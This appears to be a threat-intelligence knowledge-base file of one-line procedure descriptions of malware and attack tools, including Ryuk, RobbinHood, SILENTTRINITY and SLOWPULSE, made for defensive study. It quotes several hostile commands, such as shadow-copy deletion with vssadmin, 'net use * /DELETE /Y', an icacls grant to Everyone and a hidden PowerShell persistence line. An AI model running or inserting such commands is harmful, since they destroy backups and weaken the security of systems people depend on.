Remsec harvests plain-text credentials as a password filter registered on domain controllers.
Remsec can obtain a process list from the victim.
Remsec can ping or traceroute a remote host.
Remsec schedules the execution one of its modules by creating a new scheduler task.
Remsec can dump the SAM database.
Remsec has a plugin detect security products via active drivers.
Remsec can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.
Remsec can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.
Remsec can obtain a list of active connections and open ports.
Remsec can obtain information about the current user.
Remsec is capable of using HTTP and HTTPS for C2.
Responder is used to poison name services to gather hashes and credentials from systems within a local network.
Responder captures hashes and credentials that are sent to the system after the name services have been poisoned.
Revenge RAT has a plugin for microphone interception.
Revenge RAT used blogpost.com as its primary command and control server during a campaign.
Revenge RAT uses the Forfiles utility to execute commands on the system.
Revenge RAT has the ability to upload and download files.
Revenge RAT has a plugin for keylogging.
Revenge RAT uses mshta.exe to run malicious scripts on the system.
Revenge RAT has a plugin for credential harvesting.
Revenge RAT uses the PowerShell command &lt;code&gt;Reflection.Assembly&lt;/code&gt; to load itself into memory to aid in execution.
Revenge RAT has a plugin to perform RDP access.
Revenge RAT schedules tasks to run malicious scripts at different intervals.
Revenge RAT has a plugin for screen capture.
Revenge RAT uses Base64 to encode information sent to the C2 server.
Revenge RAT collects the CPU information, OS information, and system language.
Revenge RAT collects the IP address and MAC address from the system.
Revenge RAT gathers the username from the system.
Revenge RAT has the ability to access the webcam.
Revenge RAT uses cmd.exe to execute commands and run scripts on the victim's machine.
Revenge RAT creates a Registry key at &lt;code&gt;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell&lt;/code&gt; to survive a system reboot.
Rifdoor has added four additional bytes of data upon launching, then saved the changed version as &lt;code&gt;C:\ProgramData\Initech\Initech.exe&lt;/code&gt;.
Rifdoor has encrypted strings with a single byte XOR algorithm.
Rifdoor has been executed from malicious Excel or Word documents containing macros.
Rifdoor has created a new registry entry at &lt;code&gt;HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics&lt;/code&gt; with a value of &lt;code&gt;C:\ProgramData\Initech\Initech.exe /run&lt;/code&gt;.
Rifdoor has been distributed in e-mails with malicious Excel or Word documents.
Rifdoor has encrypted command and control (C2) communications with a stream cipher.
Rifdoor has the ability to identify the Windows version on the compromised host.
Rifdoor has the ability to identify the IP address of the compromised host.
Rifdoor has the ability to identify the username on the compromised host.
Rising Sun can archive data using RC4 encryption and Base64 encoding prior to exfiltration.
Rising Sun variants can use SSL for encrypting C2 communications.
Rising Sun has collected data and files from a compromised host.
Rising Sun has decrypted itself using a single-byte XOR scheme. Additionally, Rising Sun can decrypt its configuration data at runtime.
Configuration data used by Rising Sun has been encrypted using an RC4 stream algorithm.
Rising Sun can send data gathered from the infected machine via HTTP POST request to the C2.
Rising Sun can delete files and artifacts it creates.
Rising Sun can enumerate information about files from the infected system, including file size, attributes, creation time, last access time, and write time. Rising Sun can enumerate the compilation timestamp of Windows executable files.
Rising Sun can modify file attributes to hide files.
Rising Sun can clear a memory blog in the process by overwriting it with junk bytes.
Rising Sun can test a connection to a specified network IP address over a specified port number.
Rising Sun used dynamic API resolutions to various Windows APIs by leveraging `LoadLibrary()` and `GetProcAddress()`.
Rising Sun can enumerate all running processes and process information on an infected machine.
Rising Sun has identified the OS product name from a compromised host by searching the registry for `SOFTWARE\MICROSOFT\Windows NT\ CurrentVersion | ProductName`.
Rising Sun can detect the computer name, operating system, and drive information, including drive type, total number of bytes on disk, total number of free bytes on disk, and name of a specified volume.
Rising Sun can detect network adapter and IP address information.
Rising Sun can detect the username of the infected host.
Rising Sun has used HTTP and HTTPS for command and control.
Rising Sun has executed commands using `cmd.exe /c “&lt;command&gt; &gt; &lt;%temp%&gt;\AM&lt;random&gt;. tmp” 2&gt;&amp;1`.
RobbinHood will search for an RSA encryption key and then perform its encryption process on the system files.
RobbinHood will search for Windows services that are associated with antivirus software on the system and kill the process.
RobbinHood deletes shadow copies to ensure that all the data cannot be restored easily.
RobbinHood disconnects all network shares from the computer with the command &lt;code&gt;net use * /DELETE /Y&lt;/code&gt;.
RobbinHood stops 181 Windows services on the system before beginning the encryption process.
RobbinHood uses cmd.exe on the victim's computer.
RogueRobin has used Google Drive as a Command and Control channel.
The PowerShell script with the RogueRobin payload was obfuscated using the COMPRESS technique in `Invoke-Obfuscation`.
RogueRobin decodes an embedded executable using base64 and decompresses it.
RogueRobin can save a new file to the system from the C2 server.
RogueRobin uses a command prompt to run a PowerShell script from Excel. To assist in establishing persistence, RogueRobin creates &lt;code&gt;%APPDATA%\OneDrive.bat&lt;/code&gt; and saves the following string to it:&lt;code&gt;powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\OneDrive.ps1”&lt;/code&gt;.
RogueRobin checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.
RogueRobin created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.
RogueRobin uses regsvr32.exe to run a .sct file for execution.
RogueRobin has a command named &lt;code&gt;$screenshot&lt;/code&gt; that may be responsible for taking screenshots of the victim machine.
RogueRobin enumerates running processes to search for Wireshark and Windows Sysinternals suite.
RogueRobin establishes persistence by creating a shortcut (.LNK file) in the Windows startup folder to run a script each time the user logs in.
RogueRobin base64 encodes strings that are sent to the C2 over its DNS tunnel.
RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment.
RogueRobin gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.
RogueRobin gathers the IP address and domain from the victim’s machine.
RogueRobin collects the victim’s username and whether that user is an admin.
RogueRobin uses Windows Script Components.
RogueRobin uses various WMI queries to check if the sample is running in a sandbox.
Depending on the Linux distribution, RotaJakiro executes a set of commands to collect device information and sends the collected information to the C2 server.
Depending on the Linux distribution and when executing with root permissions, RotaJakiro may install persistence using a `.conf` file in the `/etc/init/` folder.
RotaJakiro uses the AES algorithm, bit shifts in a function called `rotate`, and an XOR cipher to decrypt resources required for persistence, process guarding, and file locking. It also performs this same function on encrypted stack strings and the `head` and `key` sections in the network packet structure used for C2 communications.
RotaJakiro sends device and other collected data back to the C2 using the established C2 channels over TCP.
When executing with non-root permissions, RotaJakiro uses the the `shmget API` to create shared memory between other known RotaJakiro processes. This allows processes to communicate with each other and share their PID.
RotaJakiro has used the filename `systemd-daemon` in an attempt to appear legitimate.
When executing with non-root permissions, RotaJakiro uses the the `shmget` API to create shared memory between other known RotaJakiro processes. RotaJakiro also uses the `execvp` API to help its dead process "resurrect".
RotaJakiro uses a custom binary protocol using a type, length, value format over TCP.
RotaJakiro uses a custom binary protocol over TCP port 443.
RotaJakiro can monitor the `/proc/[PID]` directory of known RotaJakiro processes as a part of its persistence when executing with non-root permissions. If the process is found dead, it resurrects the process. RotaJakiro processes can be matched to an associated Advisory Lock, in the `/proc/locks` folder, to ensure it doesn't spawn more than one process.
RotaJakiro uses dynamically linked shared libraries (`.so` files) to execute additional functionality using `dlopen()` and `dlsym()`.
RotaJakiro uses ZLIB Compression to compresses data sent to the C2 server in the `payload` section network communication packet.
RotaJakiro encrypts C2 communication using a combination of AES, XOR, ROTATE encryption, and ZLIB compression.
RotaJakiro executes a set of commands to collect device information, including `uname`.  Another example is the `cat /etc/*release | uniq` command used to collect the current OS distribution.
Depending on the Linux distribution and when executing with root permissions, RotaJakiro may install persistence using a `.service` file under the `/lib/systemd/system/` folder.
When executing with non-root level permissions, RotaJakiro can install persistence by adding a command to the .bashrc file that executes a binary in the  `${HOME}/.gvfsd/.profile/` folder.
When executing with user-level permissions, RotaJakiro can install persistence using a .desktop file under the `$HOME/.config/autostart/` folder.
Rover automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.
Rover automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes. Rover also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.
Rover searches for files on local drives based on a predefined list of file extensions.
Rover searches for files on attached removable drives based on a predefined list of file extensions every five seconds.
Rover automatically searches for files on local drives based on a predefined list of file extensions.
Rover has keylogging functionality.
Rover copies files from removable drives to &lt;code&gt;C:\system&lt;/code&gt;.
Rover has functionality to remove Registry Run key persistence as a cleanup procedure.
Rover persists by creating a Registry entry in &lt;code&gt;HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\&lt;/code&gt;.
Rover takes screenshots of the compromised system's desktop and saves them to &lt;code&gt;C:\system\screenshot.bmp&lt;/code&gt; for exfiltration every 60 minutes.
Royal uses a multi-threaded encryption process that can partially encrypt targeted files with the OpenSSL library and the AES256 algorithm.
Royal can identify specific files and directories to exclude from the encryption process.
Royal can delete shadow copy backups with vssadmin.exe using the command `delete shadows /all /quiet`.
Royal can use multiple APIs for discovery, communication, and execution.
Royal can scan the network interfaces of targeted systems.
Royal can enumerate the shared resources of a given IP addresses using the API call `NetShareEnum`.
Royal establishes a TCP socket for C2 communication using the API `WSASocketW`.
Royal has been spread through the use of phishing campaigns including "call back phishing" where victims are lured into calling a number provided through email.
Royal can use `GetCurrentProcess` to enumerate processes.
Royal can use SMB to connect to move laterally.
Royal can use `RmShutDown` to kill  applications and services using the resources that are targeted for encryption.
Royal can use `GetNativeSystemInfo` and `GetLogicalDrives` to enumerate system processors and logical drives.
Royal can enumerate IP addresses using `GetIpAddrTable`.
Rubeus can reveal the credentials of accounts that have Kerberos pre-authentication disabled through AS-REP roasting.
Rubeus can gather information about domain trusts.
Rubeus can forge a ticket-granting ticket.
Rubeus can use the `KerberosRequestorSecurityToken.GetRequest` method to request kerberoastable service tickets.
Rubeus can create silver tickets.
Ruler can be used to enumerate Exchange users and dump the GAL.
Ruler can be used to automate the abuse of Outlook Forms to establish persistence.
Ruler can be used to automate the abuse of Outlook Home Pages to establish persistence.
Ruler can be used to automate the abuse of Outlook Rules to establish persistence.
RunningRAT contains code to compress files.
RunningRAT contains code to clear event logs.
RunningRAT contains code to open and copy data from the clipboard.
RunningRAT kills antimalware running process.
RunningRAT contains code to delete files from the victim’s machine.
RunningRAT captures keystrokes and sends them back to the C2 server.
RunningRAT adds itself to the Registry key &lt;code&gt;Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; to establish persistence upon reboot.
RunningRAT gathers the OS version, logical drives information, processor information, and volume information.
RunningRAT uses a batch file to kill a security program task and then attempts to remove itself.
Ryuk has attempted to adjust its token privileges to have the &lt;code&gt;SeDebugPrivilege&lt;/code&gt;.
Ryuk has used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory.
Ryuk has stopped services related to anti-virus.
Ryuk can use stolen domain admin accounts to move laterally within a victim domain.
Ryuk has enumerated files and folders on all mounted drives.
Ryuk has used &lt;code&gt;vssadmin Delete Shadows /all /quiet&lt;/code&gt; to to delete volume shadow copies and &lt;code&gt;vssadmin resize shadowstorage&lt;/code&gt; to force deletion of shadow copies created by third-party applications.
Ryuk can create .dll files that actually contain a Rich Text File format document.
Ryuk has constructed legitimate appearing installation folder paths by calling &lt;code&gt;GetWindowsDirectoryW&lt;/code&gt; and then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear as &lt;code&gt;C:\Users\Public&lt;/code&gt;.
Ryuk has used multiple native APIs including &lt;code&gt;ShellExecuteW&lt;/code&gt; to run executables,&lt;code&gt;GetWindowsDirectoryW&lt;/code&gt; to create folders, and &lt;code&gt;VirtualAlloc&lt;/code&gt;, &lt;code&gt;WriteProcessMemory&lt;/code&gt;, and &lt;code&gt;CreateRemoteThread&lt;/code&gt; for process injection.
Ryuk can use anti-disassembly and code transformation obfuscation techniques.
Ryuk has called &lt;code&gt;CreateToolhelp32Snapshot&lt;/code&gt; to enumerate all running processes.
Ryuk has injected itself into remote processes to encrypt files using a combination of &lt;code&gt;VirtualAlloc&lt;/code&gt;, &lt;code&gt;WriteProcessMemory&lt;/code&gt;, and &lt;code&gt;CreateRemoteThread&lt;/code&gt;.
Ryuk has used the Windows command line to create a Registry entry under &lt;code&gt;HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; to establish persistence.
Ryuk has used the C$ network share for lateral movement.
Ryuk can remotely create a scheduled task to execute itself on a system.
Ryuk has called &lt;code&gt;kill.bat&lt;/code&gt; for stopping services, disabling services and killing processes.
Ryuk has called &lt;code&gt;GetLogicalDrives&lt;/code&gt; to emumerate all mounted drives, and &lt;code&gt;GetDriveTypeW&lt;/code&gt; to determine the drive type.
Ryuk has been observed to query the registry key &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language&lt;/code&gt; and the value &lt;code&gt;InstallLanguage&lt;/code&gt;. If the machine has the value 0x419 (Russian), 0x422 (Ukrainian), or 0x423 (Belarusian), it stops execution.
Ryuk has called &lt;code&gt;GetIpNetTable&lt;/code&gt; in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.
Ryuk has used Wake-on-Lan to power on turned off systems for lateral movement.
Ryuk has used &lt;code&gt;cmd.exe&lt;/code&gt; to create a Registry entry to establish persistence.
Ryuk can launch &lt;code&gt;icacls &lt;path&gt; /grant Everyone:F /T /C /Q&lt;/code&gt; to delete every access-based restrictions on files and directories.
S-Type has deleted accounts it has created.
S-Type has uploaded data and files from a compromised host to its C2 servers.
S-Type primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.
S-Type has deleted files it has created on a compromised host.
S-Type can download additional files onto a compromised host.
S-Type has run the command `net user` on a victim.
S-Type may create a temporary user on the system named `Lost_{Unique Identifier}` with the password `pond~!@6”{Unique Identifier}`.
S-Type may save itself as a file named `msdtc.exe`, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.
S-Type has used Windows APIs, including `GetKeyboardType`, `NetUserAdd`, and `NetUserDel`.
S-Type may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key &lt;code&gt;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ IMJPMIJ8.1{3 characters of Unique Identifier}&lt;/code&gt;.
S-Type may create the file &lt;code&gt;%HOMEPATH%\Start Menu\Programs\Startup\Realtek {Unique Identifier}.lnk&lt;/code&gt;, which points to the malicious `msdtc.exe` file already created in the `%CommonFiles%` directory.
Some S-Type samples have been packed with UPX.
S-Type uses Base64 encoding for C2 traffic.
The initial beacon packet for S-Type contains the operating system version and file system of the victim.
S-Type has attempted to determine if a compromised system was using a Japanese keyboard via the `GetKeyboardType` API call.
S-Type has used `ipconfig /all` on a compromised host.
S-Type has run tests to determine the privilege level of the compromised user.
S-Type runs the command &lt;code&gt;net start&lt;/code&gt; on a victim.
S-Type uses HTTP for C2.
S-Type has provided the ability to execute shell commands on a compromised host.
SDBbot has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe.
SDBbot has the ability to access the file system on a compromised host.
SDBbot has the ability to decrypt and decompress its payload to enable code execution.
SDBbot has the ability to inject a downloaded DLL into a newly created rundll32.exe process.
SDBbot has sent collected data from a compromised host to its C2 servers.
SDBbot has the ability to delete files from a compromised host.
SDBbot has the ability to get directory listings or drive information on a compromised host.
SDBbot has the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7.
SDBbot has the ability to clean up and remove data structures from a compromised host.
SDBbot has the ability to download a DLL from C2 to a compromised host.
SDBbot has the ability to communicate with C2 with TCP over port 443.
SDBbot has the ability to XOR the strings for its installer component with a hardcoded 128 byte key.
SDBbot can enumerate a list of running processes on a compromised machine.
SDBbot has the ability to use port forwarding to establish a proxy between a target host and C2.
SDBbot has the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege.
SDBbot has the ability to use RDP to connect to victim's machines.
SDBbot has used rundll32.exe to execute DLLs.
SDBbot has used a packed installer file.
SDBbot has the ability to identify the OS version, OS bit information and computer name.
SDBbot can collected the country code of a compromised machine.
SDBbot has the ability to determine the domain name and whether a proxy is configured on a compromised host.
SDBbot has the ability to identify the user on a compromised host.
SDBbot has the ability to record video on a compromised host.
SDBbot has the ability to use the command shell to execute commands on a compromised host.
SDelete deletes data in a way that makes it unrecoverable.
SDelete deletes data in a way that makes it unrecoverable.
SEASHARPEE can download remote files onto victims.
SEASHARPEE can timestomp files on victims using a Web shell.
SEASHARPEE is a Web shell.
SEASHARPEE can execute commands on victims.
SHARPSTATS has used base64 encoding and XOR to obfuscate PowerShell scripts.
SHARPSTATS has the ability to upload and download files.
SHARPSTATS has the ability to employ a custom PowerShell script.
SHARPSTATS has the ability to identify the IP address, machine name, and OS of the compromised host.
SHARPSTATS has the ability to identify the domain of the compromised host.
SHARPSTATS has the ability to identify the username on the compromised host.
SHARPSTATS has the ability to identify the current date and time on the compromised host.
SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder.
APT30 may have used the SHIPSHAPE malware to move onto air-gapped networks. SHIPSHAPE targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.
SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder.
SHOTPUT has a command to obtain a directory listing.
SHOTPUT has a command to retrieve information about connected users.
SHOTPUT is obscured using XOR encoding and appended to a valid GIF file.
SHOTPUT has a command to obtain a process listing.
SHOTPUT has a command to list all servers in the domain, as well as one to locate domain controllers on a domain.
SHOTPUT uses netstat to list TCP connection status.
SHUTTERSPEED can download and execute an arbitary executable.
SHUTTERSPEED can capture screenshots.
SHUTTERSPEED can collect system information.
SILENTTRINITY can enumerate the active Window during keylogging through execution of `GetActiveWindowTitle`.
SILENTTRINITY contains a number of modules that can bypass UAC, including through Window's Device Manager, Manage Optional Features, and an image hijack on the `.msc` file extension.
SILENTTRINITY can conduct an image hijack of an `.msc` file extension as part of its UAC bypass process.
SILENTTRINITY can add a CLSID key for payload execution through `Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + clsid + "}\\InProcServer32")`.
SILENTTRINITY can collect clear text web credentials for Internet Explorer/Edge.
SILENTTRINITY's `amsiPatch.py` module can disable Antimalware Scan Interface (AMSI) functions.
SILENTTRINITY can use `System` namespace methods to execute lateral movement using DCOM.
SILENTTRINITY can use `System.Security.AccessControl` namespaces to retrieve domain user information.
SILENTTRINITY can use `System.DirectoryServices` namespace to retrieve domain group information.
SILENTTRINITY can transfer files from an infected host to the C2 server.
SILENTTRINITY can remove files from the compromised host.
SILENTTRINITY has several modules, such as `ls.py`, `pwd.py`, and `recentFiles.py`, to enumerate directories and files.
SILENTTRINITY's `credphisher.py` module can prompt a current user for their credentials.
SILENTTRINITY has a module that can extract cached GPP passwords.
SILENTTRINITY has the ability to set its window state to hidden.
SILENTTRINITY can bypass ScriptBlock logging to execute unmanaged PowerShell code from memory.
SILENTTRINITY can remove artifacts from the compromised host, including created Registry keys.
SILENTTRINITY can load additional files and tools, including Mimikatz.
SILENTTRINITY contains a module to conduct Kerberoasting.
SILENTTRINITY has a keylogging capability.
SILENTTRINITY can create a memory dump of LSASS via the `MiniDumpWriteDump Win32` API call.
SILENTTRINITY can obtain a list of local groups and members.
SILENTTRINITY can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook.
SILENTTRINITY can modify registry keys, including to enable or disable Remote Desktop Protocol (RDP).
SILENTTRINITY has the ability to leverage API including `GetProcAddress` and `LoadLibrary`.
SILENTTRINITY can scan for open ports on a compromised machine.
SILENTTRINITY can enumerate shares on a compromised host.
SILENTTRINITY can use PowerShell to execute commands.
SILENTTRINITY can enumerate processes, including properties to determine if they have the Common Language Runtime (CLR) loaded.
SILENTTRINITY can inject shellcode directly into Excel.exe or a specific process.
SILENTTRINITY is written in Python and can use multiple Python scripts for execution on targeted systems.
SILENTTRINITY can use the `GetRegValue` function to check Registry keys within `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` and `HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`. It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.
SILENTTRINITY can establish a LNK file in the startup folder for persistence.
SILENTTRINITY can enumerate and collect the properties of domain computers.
SILENTTRINITY can take a screenshot of the current desktop.
SILENTTRINITY can determine if an anti-virus product is installed through the resolution of the service's virtual SID.
SILENTTRINITY can collect information related to a compromised host, including OS version and a list of drives.
SILENTTRINITY can gather a list of logged on users.
SILENTTRINITY can search for modifiable services that could be used for privilege escalation.
SILENTTRINITY can collect start time information from a compromised host.
SILENTTRINITY can find a process owned by a specific user and impersonate the associated token.
SILENTTRINITY can use `cmd.exe` to enable lateral movement using DCOM.
SILENTTRINITY can gather Windows Vault credentials.
SILENTTRINITY can use WMI for lateral movement.
SILENTTRINITY can create a WMI Event to execute a payload for persistence.
SILENTTRINITY tracks `TrustedHosts` and can move laterally to these targets via WinRM.
SILENTTRINITY can establish persistence by creating a new service.
SLIGHTPULSE contains functionality to execute arbitrary commands passed to it.
SLIGHTPULSE can read files specified on the local system.
SLIGHTPULSE can deobfuscate base64 encoded and RC4 encrypted C2 messages.
RAPIDPULSE can transfer files to and from compromised hosts.
SLIGHTPULSE has piped the output from executed commands to `/tmp/1`.
SLIGHTPULSE can base64 encode all incoming and outgoing C2 messages.
SLIGHTPULSE can RC4 encrypt all incoming and outgoing C2 messages.
SLIGHTPULSE has the ability to process HTTP GET requests as a normal web server and to insert logic that will read or write files or execute commands in response to HTTP POST requests.
SLIGHTPULSE is a web shell that can read, write, and execute files on compromised servers.
SLOTHFULMEDIA has hashed a string containing system information prior to exfiltration via POST requests.
SLOTHFULMEDIA has uploaded files and information from victim machines.
SLOTHFULMEDIA has sent system information to a C2 server via HTTP and HTTPS POST requests.
SLOTHFULMEDIA has deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system.
SLOTHFULMEDIA can enumerate files and directories.
SLOTHFULMEDIA has been created with a hidden attribute to insure it's not visible to the victim.
SLOTHFULMEDIA has downloaded files onto a victim machine.
SLOTHFULMEDIA has a keylogging capability.
SLOTHFULMEDIA has named a service it establishes on victim machines as "TaskFrame" to hide its malicious purpose.
SLOTHFULMEDIA has mimicked the names of known executables, such as mediaplayer.exe.
SLOTHFULMEDIA can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap&lt;/code&gt; registry.
SLOTHFULMEDIA has enumerated processes by ID, name, or privileges.
SLOTHFULMEDIA can inject into running processes on a compromised host.
SLOTHFULMEDIA has taken a screenshot of a victim's desktop, named it "Filter3.jpg", and stored it in the local directory.
SLOTHFULMEDIA has the capability to start services.
SLOTHFULMEDIA has the capability to stop processes and services.
SLOTHFULMEDIA has collected system name, OS version, adapter information, memory usage, and disk information from a victim machine.
SLOTHFULMEDIA can enumerate open ports on a victim machine.
SLOTHFULMEDIA has collected the username from a victim machine.
SLOTHFULMEDIA has the capability to enumerate services.
SLOTHFULMEDIA has used HTTP and HTTPS for C2 communications.
SLOTHFULMEDIA can open a command line to execute commands.
SLOTHFULMEDIA has created a service on victim machines named "TaskFrame" to establish persistence.
SLOWDRIFT uses cloud based services for C2.
SLOWDRIFT downloads additional payloads.
SLOWDRIFT collects and sends system information to its C2.
SLOWPULSE is applied in compromised environments through modifications to legitimate Pulse Secure files.
SLOWPULSE can write logged ACE credentials to `/home/perl/PAUS.pm` in append mode, using the format string `%s:%s\n`.
SLOWPULSE can insert malicious logic to bypass RADIUS and ACE two factor authentication (2FA) flows if a designated attacker-supplied password is provided.
SLOWPULSE can log credentials on compromised Pulse Secure VPNs during the `DSAuth::AceAuthServer::checkUsernamePassword`ACE-2FA authentication procedure.
SLOWPULSE can modify LDAP and two factor authentication flows by inspecting login credentials and forcing successful authentication if the provided password matches a chosen backdoor password.
SLOWPULSE can hide malicious code in the padding regions between legitimate functions in the Pulse Secure `libdsplibs.so` file.
SMOKEDHAM has added user accounts to local Admin groups.
SMOKEDHAM has used a fronted domain to obfuscate its hard-coded C2 server domain.
The SMOKEDHAM source code is embedded in the dropper as an encrypted string.
SMOKEDHAM has exfiltrated data to its C2 server.
SMOKEDHAM has modified the Registry to hide created user accounts from the Windows logon screen.
SMOKEDHAM has used Powershell to download UltraVNC and ngrok from third-party file sharing sites.
SMOKEDHAM can continuously capture keystrokes.
SMOKEDHAM has used &lt;code&gt;net.exe user&lt;/code&gt; and &lt;code&gt;net.exe users&lt;/code&gt; to enumerate local accounts on a compromised host.
SMOKEDHAM has created user accounts.
SMOKEDHAM has relied upon users clicking on a malicious link delivered through phishing.
SMOKEDHAM has modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP.
SMOKEDHAM can execute Powershell commands sent from its C2 server.
SMOKEDHAM has used &lt;code&gt;reg.exe&lt;/code&gt; to create a Registry Run key.
SMOKEDHAM can capture screenshots of the victim’s desktop.
SMOKEDHAM has been delivered via malicious links in phishing emails.
SMOKEDHAM has encoded its C2 traffic with Base64.
SMOKEDHAM has encrypted its C2 traffic with RC4.
SMOKEDHAM has used the &lt;code&gt;systeminfo&lt;/code&gt; command on a compromised host.
SMOKEDHAM has used &lt;code&gt;whoami&lt;/code&gt; commands to identify system owners.
SMOKEDHAM has communicated with its C2 servers via HTTPS and HTTP POST requests.
SMOKEDHAM has used Google Drive and Dropbox to host files downloaded by victims via malicious links.
SNUGRIDE establishes persistence through a Registry Run key.
SNUGRIDE encrypts C2 traffic using AES with a static key.
SNUGRIDE communicates with its C2 server over HTTP.
SNUGRIDE is capable of executing commands and spawning a reverse shell.
SOUNDBITE is capable of enumerating application windows.
SOUNDBITE communicates via DNS for C2.
SOUNDBITE is capable of enumerating and manipulating files and directories.
SOUNDBITE is capable of modifying the Registry.
SOUNDBITE is capable of gathering system information.
Data SPACESHIP copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.
SPACESHIP copies staged data to removable drives when they are inserted into the system.
SPACESHIP identifies files and directories for collection by searching for specific file extensions or file modification time.
SPACESHIP identifies files with certain extensions and copies them to a directory in the user's profile.
SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder.
SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder.
SQLRat has used a character insertion obfuscation technique, making the script appear to contain Chinese characters.
SQLRat has scripts that are responsible for deobfuscating additional scripts.
SQLRat has used been observed deleting scripts once used.
SQLRat can make a direct SQL connection to a Microsoft database controlled by the attackers, retrieve an item from the bindata table, then write and execute the file on disk.
SQLRat relies on users clicking on an embedded image to execute the scripts.
SQLRat has used PowerShell to create a Meterpreter session.
SQLRat has created scheduled tasks in &lt;code&gt;%appdata%\Roaming\Microsoft\Templates\&lt;/code&gt;.
SQLRat has used SQL to execute JavaScript and VB scripts on the host system.
STARWHALE can collect data from an infected local host.
STARWHALE has been obfuscated with hex-encoded strings.
STARWHALE can exfiltrate collected data to its C2 servers.
STARWHALE has stored collected data in a file called `stari.txt`.
STARWHALE has relied on victims opening a malicious Excel file for execution.
STARWHALE can establish persistence by installing itself in the startup folder, whereas the GO variant has created a `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OutlookM` registry key.
STARWHALE has the ability to hex-encode collected data from an infected host.
STARWHALE can gather the computer name of an infected host.
STARWHALE has the ability to collect the IP address of an infected host.
STARWHALE can gather the username from an infected host.
STARWHALE can use the VBScript function `GetRef` as part of its persistence mechanism.
STARWHALE has the ability to contact actor-controlled C2 servers via HTTP.
STARWHALE has the ability to execute commands via `cmd.exe`.
STARWHALE has the ability to create the following Windows service to establish persistence on an infected host: `sc create Windowscarpstss binpath= "cmd.exe /c cscript.exe c:\\windows\\system32\\w7_1.wsf humpback_whale" start= "auto" obj= "LocalSystem"`.
STEADYPULSE can URL decode key/value pairs sent over C2.
STEADYPULSE can add lines to a Perl script on a targeted server to import additional Perl modules.
STEADYPULSE can transmit URL encoded data over C2.
STEADYPULSE can parse web requests made to a targeted server to determine the next stage of execution.
STEADYPULSE is a web shell that can enable the execution of arbitrary commands on compromised web servers.
SUGARDUMP has encrypted collected data using AES CBC mode and encoded it using Base64.
SUGARDUMP has collected browser bookmark and history information.
SUGARDUMP variants have harvested credentials from browsers such as Firefox, Chrome, Opera, and Edge.
SUGARDUMP has sent stolen credentials and other data to its C2 server.
SUGARDUMP can search for and collect data from specific Chrome, Opera, Microsoft Edge, and Firefox files, including any folders that have the string `Profile` in its name.
SUGARDUMP has stored collected data under `%&lt;malware_execution_folder&gt;%\\CrashLog.txt`.
A SUGARDUMP variant used SMTP for C2.
Some SUGARDUMP variants required a user to enable a macro within a malicious .xls file for execution.
SUGARDUMP's scheduled task has been named `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` or `MicrosoftEdgeCrashRepoeterTaskMachineUA`, depending on the Windows OS version.
SUGARDUMP has been named `CrashReporter.exe` to appear as a legitimate Mozilla executable.
SUGARDUMP has created scheduled tasks called `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` and `MicrosoftEdgeCrashRepoeterTaskMachineUA`, which were configured to execute `CrashReporter.exe` during user logon.
SUGARDUMP can identify Chrome, Opera, Edge Chromium, and Firefox browsers, including version number, on a compromised host.
A SUGARDUMP variant has used HTTP for C2.
SUGARUSH has checked for internet connectivity from an infected host before attempting to establish a new TCP connection.
SUGARUSH has used TCP for C2.
SUGARUSH has used port 4585 for a TCP connection to its C2.
SUGARUSH has used `cmd` for execution on an infected host.
SUGARUSH has created a service named `Service1` for persistence.
SUNBURST also removed the firewall rules it created during execution.
SUNBURST removed IFEO registry values to clean up traces of persistence.
